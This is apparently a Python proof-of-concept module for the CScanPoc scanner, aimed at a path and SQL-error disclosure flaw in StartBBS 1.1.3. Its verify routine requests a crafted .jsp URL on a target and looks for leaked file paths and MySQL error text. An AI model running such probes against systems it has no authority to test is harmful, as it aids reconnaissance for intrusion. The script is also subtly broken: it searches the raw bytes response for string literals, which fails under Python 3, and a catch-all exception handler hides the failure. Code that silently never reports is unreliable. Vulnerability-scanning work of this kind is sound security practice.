# coding: utf-8
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'StartBBS_0102'  # 平台漏洞编号，留空
    name = 'StartBBS v1.1.3 物理路径泄漏'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2014-12-09'  # 漏洞公布时间
    desc = '''
        Startbbs - a simple & lightweight Forum. ... Hello, world! StartBBS 是一款优雅、开源、轻量社区系统，基于MVC架构。
        http://startbbs/index.php/home/getmore/w.jsp 随意构造一个.jsp爆出数据库查询语句。
    '''  # 漏洞描述
    ref = 'http://www.wooyun.org/bugs/wooyun-2013-045780'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'StartBBS'  # 漏洞应用名称
    product_version = '1.1.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9ad4b208-7a1f-435d-b125-624ba0ea6243'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            verify_url = self.target + '/index.php/home/getmore/w.jsp'
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()
            if 'Filename:' in content and 'You have an error in your SQL syntax' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
